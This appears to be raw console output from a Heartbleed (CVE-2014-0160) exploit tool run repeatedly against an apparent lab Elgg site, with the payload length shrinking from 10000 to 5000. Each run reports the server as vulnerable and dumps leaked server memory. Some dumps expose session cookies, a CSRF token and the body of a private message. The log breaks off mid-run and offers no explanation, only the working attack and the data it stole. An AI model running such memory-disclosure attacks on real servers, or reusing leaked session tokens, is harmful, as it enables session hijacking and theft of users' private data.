Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.'.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.........3....**...c.....2.?G
]8gD....e....H,
...6..BM*...9 L.7$..4.ychAq..'...g......%b........?..,....gG..Yi..).w.....~.L.........7%.R....8dH. .v..%...;j.z....)..KQF.Z.".s.{`.gAs.vr..a.H;.G[..S......(O"i..v.)....x.c..Y..W.x.#.......~2d...m..V..**.tR"..eeed..6...p.).9uZ.h..&....J..w(;.D..r...'4....]........q.d*{...BQY.f.5}y...e..UI+..G...Hx..1.e5.+.b
..&
..
.v........#~...V......&.}...UG'0...R...i..=Z.......p%.)lS..m.I.P....h..O..6B.Q.6.....T..&...Z.J....TR@...H...#..i%.|..D-..q......A..*...3Q
....".{..XQ[..D...![.r.V....Ovg.......L....#..Q..?......H..8*HU.......\.1.......A.....E.....U.5~.K..[..9.B......Wv<...4..b.f(.a.......,.g.Q;d"U..H)a.>...U..d5..9..Gr.r
:_D[.7.&.....!...S$.T.q......8h&l9F..].r%.q{W.#..r.2w....a..+>H.0.y?s..1K+Vt....I@F.l..V.....Ka...w..W..T.4S%.Z...{.a...ul..!Js..H)_...eJ.......`l.;%'D...r.......5W..@.P....
.U.|..9..p............d...Q%4Vt4.{n....[z.0-s....7Q...UzP.;.
#/x
...=3.JF..D..5.y.M5j...A.{c.,0.".5k.\$....!.;...}.8H....f.v.m.W........~1.|.J.0.?...o.T.z#I..B&(.h..8j.F.`.e#j7v.C+\......._.~W....._.Z..^@.(H._Ui...1.@\.....m.....~.xH.9.k......@..&r.x.....4....yFs-....H.c.3.K..=..FN.......=k.|.H]..z.(......'.P$...j.......E..0...A.R.b
.{..t..@..z@sCQf...2<..B.a.....6.>....._../.]..o..l|.WB..|O.AQ... ..p..i.@..t.....r.=.\...M.x(.RLj.......Di.....h2.......h2.http/1.1..........#....4....Dh.B......&.E2.@....X....-H.HM.[..3u"L.\x\.M.....!|s...y'p.+..}.q,y...({.%,C.......p6J...l.s([........+Q......m...FSG..P5...z.6..,.gW....q..(*}.F..b..?.V..YHw..O...p......-._?r.C..................l........dA.q.QII.s.`.
......... ..pC....t..X.....>.............c.......N.{.(C.........Q.|...:<...G.w.;.0@y.....l.MN..C\!%..r..6F.*0.....".....C9.j.
..S.......Z.....+.E.f..il.]3.E.\"!1.^.B..^9..
.x..f.t.?....F)S/.O..w.jq.CV....j...sR.7........zz.........
..................................h2.http/1.1-.r(=......

Completed attack with length 10000.
Running attack with length 9500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.%.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......e Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.heartbleedlabelgg.com/activity
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

.\]..*.......o..flate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

x.y..nj...;....zkm1n9o8vokge0

..-..:.........'.36Z...:...g..p....KIgz....9...PNs...5.. l1.Q...6CA3....G......O*P[X.W.......L...nA.....3l.lJfwc...Xz..<.Q.4.."/.D..L.Y+..:.....s.@.3...;...(.f.v..D`.!...Uz..Ik..|rf.\s.s4....Y9.jZh.M...r e..I.x......%j...&..l[zJtK.,.h....I...#^|4..f....[..............k#2'L....WTM.SQ...v../..v.zV.+......<|..c........U7..%..TP........!.O..a
...QR,.BT@J.Z.p.=.(.z.+
..iu..qwP...)1.#.8.Sh..3.>k.G....|..$~o....a.a.UB<..,....._..IsZ..x.y...q5S.|..8*y..0.ZW..u.........=.@I*![.@
.).c....tp7EAP...Pe%....Fb!.+.^A....|Qg~
.?...J....B..{....w:F>;.;..CLW..i\.pVbKG. |i.>|9g....B.oK..I4=.....b...#......m....l.A.5B.R..#?
@.j...D..._......._...5fU-w\..~..>....x~v.w5.U,.f.aXt..L..NC,..<..L.h.....3...9.p9 ..~)q......vb}.WZ..A.Z(.t.,._I.Z...!..(.(.)}A....ff....$..ESa.....;'...OB.z:k"..vU.,iM.a=ey+.r......V....(P........oj:......#....X....g.6.D...Fp....#X.j,uhN.^.X=..10.O.!.Ec2O.k..~.e.YG......t...(.P.?..t.....j/.v]..DrX... ..99......
...<.{.F.k..+d&aY...u......#........2..1..9....Y!..(U.7V...i2..gU/&<.K[.~.........]DB.....9#/9[$/8.B.
...^%!..1.......]>..q9j.lv..Ah....!l.$.....N........Wu0.4.`.-..)fp.xS...n...X....4Lq.O...x
.%..:..4....2.......[\A.[.
...................Di.....h2.-..........
..c........-....Di.....h2

...............
...
..c.......

a.i.X.....q>..

Completed attack with length 9500.
Running attack with length 9000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.#(AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......ke Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.heartbleedlabelgg.com/activity
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

,.DC...HA.W_V...
.r.....E...O;Pq.......f~[.F...<..S(}.....I....)...W..i..ra....X..y...[..~..8.i.d~..G2..
K.6$&.......,xdU.d..H..+:.y..&..
.;.v...-@.M...8.....v....oY1......}.....7..[..\.A.JG$.....9.....V.$..LF.RRN.....4...*g.<V....9..6i.e*.gm..g...../....#.o..{.,.wp51k.R.hc.......8bc0U.5&.b;.....+>.b....Y..Yk=k....
...
.@.JM.b.!w+"4#ij....R5.>3y..}...i...,3.D.....g.XW*R|..!....7.9.W.!..9......2.....(......-.v....]e...vmqS..'p..".ro.......h..p.P c....c..2.k?....r.*....fU..|.v*..........W?..
V......rG..le73../V..|^>.h[.....;..1s}..N-.sA,F........@..E.G.y...1xX.'....h..x...*......m3.....Q}.P7........s~.CZT..3k....0f6.b.p..+{.....d6..g..,...a.{.c?...
.]z......N...=....h.i.;...B.X.:..[...`..B.]..e..Lz..Jz".....8.,.<...R&".
..G.q.9$...LpZ...r.g..j....}.9..ov...I...[..x..oF...D...+eak......Z.1>&....\..X...qd...2.!.)|...h.e..i........+*.y......Gr..Y~.....VS.w.3.{z....6.....k.!...UJTk....
.T...n...Y.....d<E.(..'E.7...-LY...V.s|\.L..0.(....0b.x.|v...v.A..t.......d....Z...-`.......... .7...h....r.H..-.......).=.._Y.......
.....................
.......r. u.N....Q.&....b..r.~..x.=.~.k".....c_.pP.q^......0......:5u.!.~"AD37...@9....7..*....*..*.....w..0q.....+.>....O....0..Bo.0@5..-p.']..
.....c..3..lZ.ms...$.x5.KCFn.R.....m?\...A&...............www.heartbleedlabelgg.com.-..................Mx.H...9.X.u....Di.....h2........f*.?u.u./S.O@... .
Fs.EJ..it.XG........$6..=8.aj9-.g.>.|..XI?m

Completed attack with length 9000.
Running attack with length 8500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.!4AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#..........g....x&6!.....p<...f.D._.Y(....1._..9...48.....9Fvw........,..!4..&1/R/..HA.l..1..8.O..M\C. tu...)..h....>...-..J.:\|....j...WC.....D..........a.....
...
zzc.................
....................Di.....h2.+...JJ.............www.heartbleedlabelgg.com.......h2.http/1.1.-....................3....zz...c.........6....I...)J.gu.a]..,p.~..a{....9pu....."[1..g5E.eg.....6b..........Y..,).:i..u.....X..n.q8...k..&..Er...]iIJ...$
b.i...=..9)5....Ybw{.w.\..B..2..}...(......p...
ii...$.B..C;...O.pB.TX.F.....b...>.l.\c.2@...?.<....._..N.......J...GS..L'*...8.?.....Uv4...y.
._w..Sz.0......(.vU
....].#...V9.;....Gt...t|........x:k....
.]..R_..E.U.AT."..P.....1...to......$x.s......e.q..a.1x.X.
 .
..4...P.q8dgY..1...
'..Zwx....
...f..F.X...\...Q..7...7..!B&..c..J.._tT..Jo...e.@.7$.Ls....b.d..#...'.56..<.3l.H..qS..)3........lw.z....s.........rt.E..1.A7s.Z,.0..}...K
.I.5
..>....V.<I......O....Z.w"...........[..o......pl...P~XN.p.Q(...dP.t.I).3.d."^.......r..t..I<.'.G.....b#Ks}5.c...y.....k.c.3=V\.Q...|c.8.....`D$..E...._.U....
p1`...K@.q...7(.....E.FA............Z...g...%'DT....K0{>{kD/\...9]+k.........."5..-0....?.2.Vt.K.._.Cll_.W.....|..`..W).1....T......9..q....ZbA*U..!}$.k1.*..P.VM"k'...c.t...a...A.....5.D.G........\h,m..%.@W.Q..S..'sR3d.Q..p....!G....4.j.Y)..:T......S...q....L.x..#p...L.fH....'6f.s..V...X{.i.qZv...V.....#. .#u ..heJ....$P.....E..1...1sS.6..j....,&v.ky].3C...+|...
....4...I..o.D..fI0.=u.).6....(..Q...G.8GP;;.r..BG.4c,.*pr)..$8.Y.........cW....DF./......R.huaW..
s.,.+...b."..T#......|..+....q..... Y..X..P..?.
.SRx'...........h.B.........#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%........
_DS.Ho+".Y.0....

Completed attack with length 8500.
Running attack with length 8000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

..@AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#...........
.......{. t.(._..,.....D(9.%...6..5....$
.......
NE....-..O6....yP..Z..nn".r.....wwu.....5.V.A.......<..........)..B.N9.. .nk..FL..IJ.,85.!
..g.S...H....?qB..*N.M...i.c..U.....Mn..!...........Di.....h2......#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%....3.........c...S...r..u.:.W..A9.;7...zdQ.....3u.7(..Aw.......K.....Rt.NF.........:t....V.2.....aw.d .dq!..kLDL..hF..L...W.E....
.d7t..iER.w.).`)*...{..=.Y.ul.....(n[..j.`..=.',.$_......}...6HD..{.`...:a.J.yL.u.....f8s...>.Q......[.:.."x.L....|....W..UA6F`.....o......C.D.Z3..{;b@.4.He.z.[:.U....=..j$.._S?@.?P...QJ..F..0).=.i.l:....@..v....*j..>....9.Vd<....+..+8.4jZ..0..q.f\`a.......O.a.l..\...Q..!s..j....r5..p+Z%..g..Y..S.2..G...@...2..`...wG.\v..}...VdV...~.w(v.@VXJ"...s..~y.-a.C.Z....+\(..=.Qj.T.$.E.[O.K].a`.P.{.Xg...y2.&.XdN|.).rq.."[.L.5.......{(..Ej{.>t.4..eO6.*.X.<..Z...3k3C..#..\k....(.)W...$...@M..A.6.Tea..U.....<#,J..(..2*#..LN......u....
.1=.....&M..).{..>...g...Zw.r..a&^$.tT.....'..ZV..A@.s..8..|....,..C.$.?8.,..C..R.......X1V...........w.J.q.?..)..b.7.b.DK7...M$.....L.<.I..X....g.6.]...}9.P;>.1
.
......l. .Q.:..5P.%.2a.as;D-...i,2.....M.; ?H..P1.w..l<bA...n.u.O..4#....V...e.nAyJ.Vj..........aQ`...er..Y..*..T...a
..~....C.5.q.<...9.......s
..G.P%.V.z1.u.`...h.Z.y..VU.Tn..K..l),.D;*.s..`kT..u.r=.*H....s-S..$.C....W..>.c~W...U..C..!...... .bi....i.F .......Dt'|.z.c..xk..()...0.}l.u;gAHp.Y....|T.?; Of)l...z..e....
."...C......W...s......#j.:lD..-.@f.V`..?.D/E.s...+....>.L...;...E.F.U
a.}.h...m....*.,@m.F... ..".A......u......85.1......6.=6.
...
..c....................b...V...Z..>....STD'.0%.........G.......&.-.....+...............
::c........+8...ex....T..

Completed attack with length 8000.
Running attack with length 7500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

..LAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://www.heartbleedlabelgg.com/messages/add/33
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

\...D.......F...p, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

__elgg_token=a017028027520a9547a440da6a60c56b&__elgg_ts=1729485922&recipient_guid=40&subject=Another+secrets%21&body=Yes%2C+very+secret+indeed%21.t.0?..n..j...K...T+.|..q..K4<....Z.5.RehF..X).f?w.c>{[P`....I0..5..)U...N.%>..v..EY.[.Z.;..b.b.F]...Y..6...W.a.......u.=..T.|Gd.]t..+..-..v..:..Hq....1.s......
*/..~.s.Q.lU%...V......
..&....pFYL y.4.-..Z.....s-#.-TYWyX:....2..o4.K.JT..Ea!.'...wr..?....R'......R 6M...s.
.e.L<.....>.9.u..e....uuX..Y'..{.J.?.9u...,P..l....@l.B.8...8A..tY4\..Z...zz.BGWX...,..;m...o.......q..2>k;Q.........C.........D.:=..I..mi..L./a.X....k(.P..4P:..,.~>....K..70...._..E. <.Q].g..r.:a....c.@4./..K...5...+
..x..}X3..........z.JA..>......._E....(,..>f..*O+.A9.q.".|./.....C..F2.
S$QPY.........
a5-[.RW.U,..M.N..zu........e.
C'..u......L....73.3.6"$.G....0..../...grvD.u.Y..yS.!C..].ly.U..Y.V..\.].|fS..6...QG...X....|2;0..].|1..n4..FJ.....Gy
.2.......&..X.m.b8.....3..Yv.{5.|CC.&..tW.KO{|.\\.h....Z[M..W..........w...
.._x.q... ....z..."...e.....3......S.T\&.w........+.........Di.....h2.........www.heartbleedlabelgg.com.......h2.http/1.1**....Di.....h2.........www.heartbleedlabelgg.com.+.............ZZdQIm...d...E.

Completed attack with length 7500.
Running attack with length 7000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

..XAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.........M..
.$h....MW..Y?.Yq....../..I'.....]h...hf.QT.c...*....%....4&0.....j4.._.c..+.....%......]..W.m_y..$.56.e.....|X.......f.2.eN3.D;.z;....f......).l..:......;....aLd....v%IX.nD.).p:..:.8F..'c.(.....P
S....*w...^.I....c... r...O..v?.N........
...........................h2.http/1.1.....
...
..c........3.........c.....#....,....!......e..&..hv....,....(.fkHV....R...v.6.3C7...a.Y\..&h.....7gC..R..U...q.TW.A.A.U.......5.d8vYKxQ.....
....
a<_...XX.e.2y0]s|......A.5........`([..".[..*.....?.[.....tz..E@(i....3#~.R....'U..>x.<j'E.g..2o.....3~k.%.;..;.2.'.eC....a.xj
...bU...y.#....+MG..k0u........
...........+E.....yl-_.j....3..g| .....=..:.(....!.'Zz...>.a4.@$R.fz\..(..?.'..|..a.......w....x.k...<B..<k...
......x..... .S..e..k....K~...4E.3T.N.S.:5e$.*e.
e..+...Q...i..i....[,..Ek...6nR)Fz{-..G...X..s<....S.B|..Kw.bp
.;.xBJ.z..J.Yh.....hE.k.B5.....MNf..Q2.AR}..=u...d.rZS.u..5L.h.H..w..i..US.....R.......ZN..]........69@.a..#.[#..H.H.P66.f...J...R....>8.!..P,-......7..C...19h..l..9.e.:..R...k.4l[.N...(.6.|..h....,T..S.:...p..P._."..*.fs[2..i+T.b...Bdc....A....Au.G..{{4.a..f6Rx.@g.......?....\.zz..]_a......N.....l>.......BV.......j.Z.....`rn.H.\5..Z07....%D.TZo?.j"A..0..p.be ..............&...pj.~qP.ga.R...D..H]z...ZM&..._....k|....<<.u.QS..DEg...g...K...r.g..............X.......BH.......C..*...#ST.......o:..eW..KM.3..F.42.$...Xuc.x.A+.:......o'.2gL.u.....J..j}bP.+...Vs.k...Tzj...Qh.H..0.9)..6...=k.......Q.c.2.r.J.J...#n....A....8.u.Y.h..+....f.0k..=....>..1
c.].N..-.0...
2..]...`.k.%...xT......&.....@...8Z...'.R......... ......fi...&n...2.........>..z.R......#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%...............h2.http/1.1jj,......1.....d..

Completed attack with length 7000.
Running attack with length 6500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

..dAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......x#."..8......H6..'....v...,.....\~..O.x..?.....c}.i.*...#=.....H..|t.U..
..k...z..k9.QZ.....hr.
."..
R.......b.0...K3)...|....G..q......JE]).p8........9L2?....................www.heartbleedlabelgg.com.......h2.http/1.1........
....................Di.....h2.+...

..............-.....
...
..c........3.........c.......S....yH....vw.|.....r....&CN..K....E3.EB*.N...".o.Y.A."..i.....$.L..w...KN#.{...C.Y.|.5vae
)Wfir.RK........#.h!.Ze...xgF;.AO;..}.....L........;...3...5.ht.&_?.PEi%..% .P.{....H(.S.....$c.0\C#....<.....@..F.r^...'I...759.
.VD..e.l.pv.A...m"'.$l.dsFz3MZ4.....5 ...\.yG....i|w6A...xl...r.>.......i..J6..a]...y|m....;.I9..'%. 8..<z..Q....r.2..(...<.w.......I^O.0.E...N..~.Q!...h....g......&.z....X2.a.?..,....>6...&Ac....r.!..K..6...=.C....k...e......4..zpI~..d..@..#2@..c...U.1..5..5-.$....xp[..Z..\.)<.i....:!.O...TI.8pa,N..........kZW9[E
....YXC.{..._.......KnOS.5..r@YM..U1.k.....Y:..D..Q4....B..'.I.gI!.....Q...........`.o..=.O..#W.. .......yTh#..2...G...j4f.r.J.n.n).!...S..>\...W.wv..m..._....3i..v.j..0..qz |..[.`.wQ...o..<.dl`H.....5..B+2g..9...V{..d.6..zB.:qU;r:..I4C.S.......$....90.K"R
..Qi.w0A......r.}i.v..0R.qG...........#6. rk...Ue......N.Ua.+.F........b..L.7g.l..T....yD,.`.I.D.)x#..i^9.]?..5.......cUtj9D^..j....W. ..'.HA.TSt...1H.M.....mU.[...Ze'O'....*a2..0z.M.....F.+..d..F.a.?...../.......|...0b.$'."..W..].:X.G..%...i..cI...YLa....CF...K ..f..2 w...?.<..%.....%........7w...>'.........hT;.;....G.H.8%7.s....0\]u&.yI.Kee. .C DY.<w.}T.C..gF...\\..d.:..q."t...E.&1.O......SsI~\..F..f.p..{mB......... .&.....!Q......#}f..2......Z|Hn#.#.......o.........#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%'._.......

Completed attack with length 6500.
Running attack with length 6000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

..pAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......,C.......p6J...l.s([........+Q......m...FSG..P5...z.6..,.gW....q..(*}.F..b..?.V..YHw..O...p......-._?r.C..................l........dA.q.QII.s.`........
...
::c........3....::...c....fc...mI.^...b.7{xY6.N......=.....t.......Ey....t...d...D..............'.TY.A..*..f5.'..;...[...$...........aa..4..Ns....:z...L:.0g..AU!....m...gm..R..B. .d......xx.....rk...v..5
`..+F.g.[..g.._.)&E...(2.'r(Y...\T..oY......P.%c2<.a....g........
..]..x..k...T.i4..K.4 D.$.,.q..y....bF=........{&.....A..(#}.W_z.8x*j.f./L.....6V.....\..P...e...;..5....)..,f..C.g(.2Z......w.#.....d.,..-.0y{-..].@...ZD.n...fi.n2...)D..e....J.....D*.S...nZ..Y<..!."f..I..t.u8........\FY.../z.bY........O.-5.W..........6%,w.V.ai.#]w...+s\p.......U.a...U.7J\9.........xS..m$)l...l.......n.('.:"nI....&6..<WxB~.2D.......1.#.\.....S.....y....g[.5zN.T'...eJ9......Tw..D...r<...e.R..._..b..n.....K..l..
...g....T......! ......mx....H3G...{C.`..>.......,..;k..zT%E.
..[H`...H.w4..`..1.k.b...e..z...YJ........g.a/.F...$*W\jlR.........O...8.m..c..E...$.pKb>.6.........
..C...A.e(
PbtN0......tK.1>.q6.
>....
p..F.!.y6H....F.u2.$...m.S..a.3..K.c. '....J.{.xo..v...$..E...Q.Yo|.A3..%..u.(.R0j
F7....h.Hm.[.k.s.G.8.g.'@........n.v.].N.q...).@>..Hw.z..DPa.1.?2X.....gQ..G.t-Xs. |t.(q.5.....q`...f.v.#P..wkk@.@...;:..EI.d....E .5..T].{...M.....0.nu...\.x.o.i5U..b.....*.....eedf'=j....jg%.B.v.` ".Y....q......L....G...u`.'..G...Q.....p;46....K...(..9.... +Z)I........V.....@*...pC.#.. *7.
..................................-...........h2.http/1.1Di.....h2.
......... i..k...J.....9.....Q.....r:.&.w-..{t.3.7(.....A...\Tb
.o.9...{.M....E.,6zX.....0.X...TK.9.rA.J.....aC./8.`m....p.BeY.].J).....n..0/b..P-..r........aB%M..2B.g.....s.O.....&....2......dC.>j........ue.o.e..N..l.3]..,....df..o..+...{@H.q+..9F...Z.Gz....&.(.|....K!..N/...-..`.Q..............www.heartbleedlabelgg.comZZ;.........D.V.

Completed attack with length 6000.
Running attack with length 5500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

..|AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#............B...{{.g4v..r.%[..*n..i..L..s`......B*...s..2..3.e..M #vo..}+U........C>Td....c...i....,..M!;Y.m.(....]..\..x..b.A.Hw....X..WK..<9.D..v.'=7.:.\.Bv.h...........h2.http/1.1.................
...
zzc................www.heartbleedlabelgg.com.3....zz...c.....<.
F......."..._....9.Y ...1.!..X.....Ij.T.`.W........#......d...U.....U..ORT......pr.i:.)e.W..|..........H/z.kk..$..2..........(......Gg.........%.c.H...."U.F..g.....N...^.l.2}.)T.!...*..<.k.d...z_.z/..o.&.S.....5.DB.!..@l7P..f#.@.... ;.3^S:t.1v...O....b8+./..8.{.6je...W......9.....X..w[&.....:G.X.....HB...d.(...I.ZZ1Z..5...}.J....H:..q.....^.:.....'.T. .({Z@<.q...H...Z.z)$....../T...k>........ xvEp..7c..,
9 ..)1C .
p...c.&.:....{..lB....Z..(..I...!.m..........9
<..............e9.....fL...53q.p..xC.R4t....h....1]g...24..F.Hw....<.L.K;A.^
.o.8..K.h[.A.[...P...."...(4.Uz...;K;Q|#.'...4.[`..*..R..M..p..i...g......e..u..c.N.&..+.."...........]I...F'.RMW.W..4..}V.0.........k.0..LH......Ev.8E..M......qX..q4O.D....s.o7...h_ju.$\H<..l...B..M...Yi}z@.T.*/T...B...'.8.0o.....|..SA.O=.~.4..4i..a.:./y9RK(....e3.....u.X<&{..\2..._.).......jG..7......../..N..$c.S......a..%.'J@:....._/...u..c..;.!.
..].....&T...V&.Tq
H!.p.L'...M.P^..;.z.6:...O....t.[p..w.P.>.xNy.{....&.z............0=7........8.....i...K}..T.
k..f.../E8...[....9....%u.D9.....o....C/ ..M...
........Q.:jAJ0.W(...'w....j[.?..BF.
u`.@#..w......W..A.$...N3..Z.........f6..RJ.o..I.6....6..H.G5..,...k.Ur.D..s...w+..}.......&h@.Y$..X.........$..Z...i..... ...W.g.a.x.'qZa..c..{i.3..g....=.+..............-.........Di.....h2.#....4....Dh.B......&.E2.@....X....-H.HM.[..3u"L.\x\.M.....!|s...y'p.+..}.q,y...({.%,C.......p6J...l.s([........+Q......m...FSG..P5...z.6..,.gW....q..(*}.F..b..?.V..YHw..O...p......-._?r.C..................l........dA.q.QII.s.`.
....................

....[..q.:...x8.%.i..O..[.I..<zz2 ydF.N.....*.t.

Completed attack with length 5500.
Running attack with length 5000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
